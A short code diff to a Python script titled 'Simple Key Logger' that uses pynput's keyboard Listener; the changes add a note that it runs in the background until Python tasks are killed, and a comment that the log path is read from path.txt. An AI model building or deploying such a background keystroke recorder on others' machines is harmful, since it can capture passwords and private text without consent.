@@ -2,6 +2,9 @@
 """
 Simple Key Logger
 
+The keylogger runs in the background,
+to terminate end all python tasks from task manager
+
 Created on Mon Sep 30 20:14:13 2019
 
 @author: Tim Seymore
@@ -11,6 +14,7 @@ import logging
 from pynput.keyboard import Listener
 
 
+# read log file path from path.txt
 with open("path.txt", 'r') as f:
     LOG_FILE = f.read()
 
